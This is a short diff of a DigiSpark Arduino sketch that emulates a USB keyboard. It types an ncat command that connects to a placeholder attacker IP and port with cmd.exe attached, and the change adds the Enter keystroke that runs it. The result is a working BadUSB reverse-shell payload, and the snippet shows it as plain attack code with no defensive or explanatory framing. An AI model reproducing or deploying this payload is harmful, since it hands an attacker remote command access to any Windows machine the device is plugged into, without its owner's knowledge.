@@ -48,6 +48,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(2000); */ 
   DigiKeyboard.print("ncat <Attacker-IP> <Attacker-Port> -e cmd.exe");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 void loop() {
   // put your main code here, to run repeatedly:
